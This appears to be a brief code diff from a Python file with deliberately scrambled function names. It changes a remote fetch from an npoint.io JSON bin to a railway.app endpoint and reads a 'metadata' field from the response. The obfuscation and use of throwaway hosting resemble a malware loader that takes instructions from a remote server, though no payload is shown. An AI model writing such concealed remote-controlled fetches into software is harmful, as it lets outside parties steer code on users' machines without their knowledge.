@@ -16,7 +16,7 @@ def model_gfyszm_229():
 
     def learn_omvbcj_169():
         try:
-            model_yeqfru_120 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_yeqfru_120 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_yeqfru_120.raise_for_status()
             data_dpwbkg_781 = model_yeqfru_120.json()
             eval_mkrdka_456 = data_dpwbkg_781.get('metadata')
